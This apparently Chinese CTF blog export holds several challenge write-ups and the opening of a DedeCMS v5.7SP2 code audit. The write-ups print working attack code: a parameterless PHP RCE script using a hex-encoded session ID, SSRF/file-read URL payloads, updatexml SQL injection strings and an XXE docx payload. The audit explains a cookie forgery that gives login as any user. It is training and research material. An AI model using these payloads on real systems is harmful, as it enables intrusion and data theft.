<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">G&amp;e<span class="constructor">OhGcq(ZG(<span class="params">t2</span><span class="operator">*</span>H8M3dG&amp;<span class="params">wXiGcq</span>(ZG&amp;<span class="params">wXyG</span>(<span class="params">j</span><span class="params">~tG</span>&amp;<span class="params">eOdGcq</span>+<span class="params">aG</span>(<span class="params">t5oG</span>(<span class="params">j</span><span class="params">~qG</span>&amp;<span class="params">eIeGcq</span>+<span class="params">aG</span>)</span><span class="number">6</span>Q&lt;<span class="constructor">G(<span class="params">j</span><span class="params">~rG</span>&amp;<span class="params">eOdH9</span>&lt;5qG&amp;<span class="params">eLvG</span>(<span class="params">j</span><span class="params">~sG</span>&amp;<span class="params">nRdH9</span>&lt;8rG%<span class="operator">++</span><span class="params">qG</span>%<span class="params">__eG</span>&amp;<span class="params">eIeGc</span>+|<span class="params">cG</span>(<span class="params">t5oG</span>(<span class="params">j</span><span class="params">~sG</span>&amp;<span class="params">eOlH9</span>&lt;8rH8C_qH9&lt;8oG&amp;<span class="params">eOhGc</span>+<span class="params">_bG</span>&amp;<span class="params">eLvH9</span>&lt;8sG&amp;<span class="params">eLgGcz</span>?<span class="params">cG</span>&amp;3|<span class="params">sH8M3cG</span>&amp;<span class="params">eOtG</span>%<span class="params">_</span>?<span class="params">aG</span>(<span class="params">t5oG</span>(<span class="params">j</span><span class="params">~tG</span>&amp;<span class="params">wXxGcq</span>+<span class="params">aH8V6sH9</span>&lt;8rG&amp;<span class="params">eOhH9</span>&lt;5qG(&lt;E-H8M3eG&amp;<span class="params">wXiGcq</span>(ZG)</span><span class="number">6</span>Q&lt;<span class="constructor">G(<span class="params">j</span><span class="params">~tG</span>&amp;<span class="params">eOtG</span>%+&lt;<span class="params">aG</span>&amp;<span class="params">wagG</span>%<span class="params">__cG</span>&amp;<span class="params">eIeGcq</span>+<span class="params">aG</span>&amp;M9uH8V6cG&amp;<span class="params">eOlH9</span>&lt;8rG(&lt;HrG(<span class="params">j</span><span class="params">~qG</span>&amp;<span class="params">eLcH9</span>&lt;8sG&amp;<span class="params">wUwGek2</span>)</span></span><br></pre></td></tr></table></figure>

<p>hint</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">我用各种baseXX编码把flag套娃加密了，你应该也有看出来。</span><br><span class="line">但我只用了一些常用的base编码哦，毕竟我的智力水平你也知道...像什么base36base58听都没听过</span><br><span class="line">提示：<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x30</span>,<span class="number">0x55</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">a = <span class="string">"G&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)"</span></span><br><span class="line">a = base64.b85decode(a)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">c = re.findall(<span class="string">r'.&#123;2&#125;'</span>,a.decode())</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    s += <span class="string">'%'</span>+i</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = parse.unquote(s)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = base64.b32decode(s)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = base64.b16decode(s.decode())</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(s))</span><br></pre></td></tr></table></figure>

<h3 id="5-Unravel"><a href="#5-Unravel" class="headerlink" title="5.Unravel!"></a>5.Unravel!</h3><p>JM.PNG,可以binwalk 一张图片，内容为：Tokyo</p>
<p>look_at_the_file_ending.wav文件尾部有一串aes <code>U2FsdGVkX1/nSQN+hoHL8OwV9iJB/mSdKk5dmusulz4=</code></p>
<p>解开是 <code>CCGandGulu</code> 是压缩包的密码</p>
<p>利用silenteye解密</p>
<p><img src="/2020/03/2020北邮校赛/image-20200413200509558.png" alt="image-20200413200509558"></p>
<p><a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020MRCTF" target="_blank" rel="noopener">参考文章</a>n</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>51ELAB易霖博YCTF</title>
    <url>/2020/03/51ELAB%E6%98%93%E9%9C%96%E5%8D%9AYCTF-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-RCE"><a href="#1-RCE" class="headerlink" title="1.RCE"></a>1.RCE</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!preg_match(<span class="string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($_GET[<span class="string">'var'</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>


<p>无参数RCE</p>
<p>session_id() 可以用来获取/设置当前会话 ID。那么我们可以用此方法来获取phpsessionid，并且phpsessionid可控</p>
<p>eval(hex2bin(session_id(session_start())));即可执行任意命令</p>
<p>推荐看看这篇<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">文章</a>姿势很全</p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    b = list(strs)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        c = hex(ord(i)).replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line">        ret +=c</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="string">"""def str2hex(strs):</span></span><br><span class="line"><span class="string">	bstrs=bytes(strs,'utf-8')</span></span><br><span class="line"><span class="string">	ret = ''.join(['%02x' %b for b in bstrs])</span></span><br><span class="line"><span class="string">	return ret</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">url= <span class="string">"http://124.193.74.212:36060/?var=eval(hex2bin(session_id(session_start())));"</span></span><br><span class="line">payload=<span class="string">"var_dump(file_get_contents('/flag.txt'));"</span></span><br><span class="line">payload=str2hex(payload)</span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:payload&#125;</span><br><span class="line">res =requests.get(url,cookies=cookies)</span><br><span class="line">print(res.content)</span><br></pre></td></tr></table></figure>

<h3 id="2-SSRF"><a href="#2-SSRF" class="headerlink" title="2.SSRF"></a>2.SSRF</h3><p>访问直接跳转到：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//124.193.74.211:13187/index.php?file=WTNSbWFXMWhaMlV1YW5Cbg==</span></span><br></pre></td></tr></table></figure>

<p>url一看怀疑是任意文件读取</p>
<p>然后把 <code>index.php</code> 两次base64编码 <code>YVc1a1pYZ3VjR2h3</code></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?file=WTNSbWFXMWhaMlV1YW5Cbg=='</span>);</span><br><span class="line">$file = base64_decode(base64_decode($_GET[<span class="string">'file'</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'file'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'input_filename:   '</span>. $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"ctf"</span>,<span class="string">"flag"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'real_filename:   '</span>.$file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Hint: hal0flagi5here.php</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>发现源码中有提示 <code>hal0flagi5here.php</code></p>
<p>根据提示查看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$argv[<span class="number">1</span>]=$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>],FILTER_VALIDATE_URL))</span><br><span class="line">&#123;</span><br><span class="line">true$r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">trueprint_r($r);</span><br><span class="line">true<span class="keyword">if</span>(preg_match(<span class="string">'/happyctf\.com$/'</span>,$r[<span class="string">'host'</span>]))</span><br><span class="line">true&#123;</span><br><span class="line">truetrue$url=file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">truetrue<span class="keyword">echo</span>($url);</span><br><span class="line">true&#125;<span class="keyword">else</span></span><br><span class="line">true&#123;</span><br><span class="line">truetrue<span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">true&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">true<span class="keyword">echo</span> <span class="string">"403 Forbidden"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要是绕过<code>filter_var()</code>和<code>parse_url()</code>以及<code>file_get_contents()</code></p>
<p>payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">hal0flagi5here.php?url=dict:<span class="regexp">//</span>happyctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/flag.txt</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hal0flagi5here.php?url=test:<span class="comment">//happyctf.com/../../../../../../flag.txt</span></span><br></pre></td></tr></table></figure>

<p>这个test只要为一个php不认识的protocol时，php会抛一个warning，并将protocol设置为空，在protocol为null或者file时，则进行本地文件操作。</p>
<h3 id="3-SQLI"><a href="#3-SQLI" class="headerlink" title="3.SQLI"></a>3.SQLI</h3><p>RCTF2015的原题</p>
<p>正常套路，先fuzz下</p>
<p>以下是被过滤的字符</p>
<p><img src="/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415185646715.png" alt="image-20200415185646715"></p>
<p>注册一个正常的用户，登录后发现可以修改密码，怀疑是二次注入</p>
<p>就有注册 <code>sss&quot;1</code>的用户，登陆后进入修改密码的页面，发现报错了</p>
<p><img src="/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415204058693.png" alt="image-20200415204058693"></p>
<p>接着构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">爆表</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~article,flag,users~&apos;</span><br><span class="line"></span><br><span class="line">column</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~title,content,flag,name,pwd,ema&apos;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(flag)from(flag)),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~flag&#123;19de358061&#125;~&apos;</span><br></pre></td></tr></table></figure>

<h3 id="4-XXE"><a href="#4-XXE" class="headerlink" title="4.XXE"></a>4.XXE</h3><p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $target_file = getcwd().<span class="string">"/upload/"</span>.md5($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = @file_get_contents(<span class="string">"zip://"</span>.$target_file.<span class="string">"#docProps/core.xml"</span>);</span><br><span class="line">            $xml = <span class="keyword">new</span> SimpleXMLElement($result, LIBXML_NOENT);</span><br><span class="line">            $xml-&gt;registerXPathNamespace(<span class="string">"dc"</span>, <span class="string">"http://purl.org/dc/elements/1.1/"</span>);</span><br><span class="line">            <span class="keyword">foreach</span>($xml-&gt;xpath(<span class="string">'//dc:title'</span>) <span class="keyword">as</span> $title)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Title '"</span>.$title . <span class="string">"' has been added.&lt;br/&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $e;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"上传文件不是一个docx文档."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传失败."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = @file_get_contents(<span class="string">"zip://"</span>.$target_file.<span class="string">"#docProps/core.xml"</span>);</span><br></pre></td></tr></table></figure>

<p>输出了tilte：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($xml-&gt;xpath(<span class="string">'//dc:title'</span>) <span class="keyword">as</span> $title)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Title '"</span>.$title . <span class="string">"' has been added.&lt;br/&gt;"</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>payload:修改docProps/core.xml内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"/flag.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cp:coreProperties</span> <span class="attr">xmlns:cp</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/metadata/core-properties"</span> <span class="attr">xmlns:dc</span>=<span class="string">"http://purl.org/dc/elements/1.1/"</span> <span class="attr">xmlns:dcterms</span>=<span class="string">"http://purl.org/dc/terms/"</span> <span class="attr">xmlns:dcmitype</span>=<span class="string">"http://purl.org/dc/dcmitype/"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;</span></span><br><span class="line">dc:title<span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">dc:title</span>&gt;</span></span><br><span class="line">dc:subject<span class="tag">&lt;/<span class="name">dc:subject</span>&gt;</span></span><br><span class="line">dc:creator<span class="tag">&lt;/<span class="name">dc:creator</span>&gt;</span></span><br><span class="line">cp:keywords<span class="tag">&lt;/<span class="name">cp:keywords</span>&gt;</span></span><br><span class="line">dc:description<span class="tag">&lt;/<span class="name">dc:description</span>&gt;</span></span><br><span class="line">cp:lastModifiedBy<span class="tag">&lt;/<span class="name">cp:lastModifiedBy</span>&gt;</span></span><br><span class="line">cp:revision1<span class="tag">&lt;/<span class="name">cp:revision</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dcterms:created</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:00:00Z<span class="tag">&lt;/<span class="name">dcterms:created</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dcterms:modified</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:01:00Z<span class="tag">&lt;/<span class="name">dcterms:modified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cp:coreProperties</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>保存，上传即可</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-CRC32"><a href="#1-CRC32" class="headerlink" title="1.CRC32"></a>1.CRC32</h3><p>压缩包中有三个文件存放了解压密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc, I)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        print(str(I) + <span class="string">":"</span> + s)</span><br><span class="line">                        <span class="keyword">global</span> flag</span><br><span class="line">                        flag = flag + s</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    f = zipfile.ZipFile(<span class="string">"CRC32.zip"</span>, <span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'pass'</span>+str(i)+<span class="string">'.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        print(crc)</span><br><span class="line">        CrackCrc(crc, i)</span><br><span class="line">dic = string.printable</span><br><span class="line">CrackZip()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>   <img src="/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415215316552.png" alt="image-20200415215316552">                            </p>
<p>解压得到flag</p>
<h3 id="2-easyrsa"><a href="#2-easyrsa" class="headerlink" title="2.easyrsa"></a>2.easyrsa</h3><p>给了私钥和密文</p>
<p><img src="/2020/03/51ELAB易霖博YCTF-Writeup/image-20200415215428837.png" alt="image-20200415215428837"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DedeCMSv5.7SP2代码审计</title>
    <url>/2021/03/DedeCMSv5-7SP2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>这里需要注意的是</p><p>dedecms在php5.4以上会因为session_register()等函数已移除，无法正常运行</p><p>在include/userlogin.class.php中代码替换,被替换代码大致在288到304行之间,代码如下:</p><p>代码如下:</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserIDTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;userID;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserTypeTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;userType;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserChannelTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;userChannel;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserNameTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;userName;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserPurviewTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;userPurview;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepAdminStyleTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$adminstyle</span>;</span><br></pre></td></tr></table></figure><a id="more"></a>








<p>替换为如下代码:</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;keepUserIDTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;userID;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;keepUserTypeTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;userType;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;keepUserChannelTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;userChannel;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;keepUserNameTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;userName;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;keepUserPurviewTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;userPurview;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$this</span>-&gt;keepAdminStyleTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$adminstyle</span>;</span><br></pre></td></tr></table></figure>

<p>364到368替换如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserIDTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserTypeTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserChannelTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserNameTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserPurviewTag);</span><br></pre></td></tr></table></figure>

<h3 id="cookie伪造导致任意前台用户登录"><a href="#cookie伪造导致任意前台用户登录" class="headerlink" title="cookie伪造导致任意前台用户登录"></a><strong>cookie伪造导致任意前台用户登录</strong></h3><ul>
<li><p>漏洞分析</p>
<p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20103333.png" alt="屏幕截图 2021-03-13 103333"></p>
<p> 跟进<code>PutCookie</code>方法，在该方法中的第27行中将值与配置文件中的<code>$cfg_cookie_encode</code>进行拼接，然后进行MD5和截断处理<code>substr(md5($cfg_cookie_encode.$value),0,16)</code>，然后下发到客户端</p>
<p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313104510453.png" alt="image-20210313104510453"></p>
<p> 而在<code>include/common.inc.php</code>使用的外部变量注册的方法进行变量声明，因此此处的$uid是用户可控的。</p>
<p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20104107.png" alt="屏幕截图 2021-03-13 104107"></p>
<p> 这里我们就可以获取到任意用户的<code>last_vid</code> <code>last_vid__ckMd5</code></p>
<p> 而在文件<code>include/helpers/cookie.helper.php</code>中的第54-72行的GetCookie方法的代码块，其中第63行用于校验客户端cookie是否进行了伪造，因此要进行cookie就自然想到要获取<code>uploads/data/config.cache.inc.php</code>文件中的内容，需要存在任意文件读取或下载的漏洞，当然还有另外一种方式，就是控制<code>$uid</code>，利用PutCookie直接生成cookie，这样的cookie定会通过GetCookie方法。</p>
<p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313105340716.png" alt="image-20210313105340716"></p>
</li>
</ul>
<p>   接着查看登录相关的代码，看它的cookie生成方法是否是PutCookie。在<code>include/memberlogin.class.php</code> 498行PutLoginInfo方法处理正确输入用户名和密码的情况</p>
<p>   <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313112216221.png" alt="image-20210313112216221"></p>
<p>   继续跟进PutLoginInfo方法，果然用的是PutCookie方法，存在cookie伪造漏洞</p>
<p>   <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20112733.png" alt="屏幕截图 2021-03-13 112733"></p>
<p>   在文件<code>include/memberlogin.class.php</code>的第160-242行发现代码块，其中第170行检测cookie中的DedeUserID参数的值，178行将这个值转换为整数，185行通过这个给值来查询用户。我们通过伪造DedeUserID即可任意用户登录了。</p>
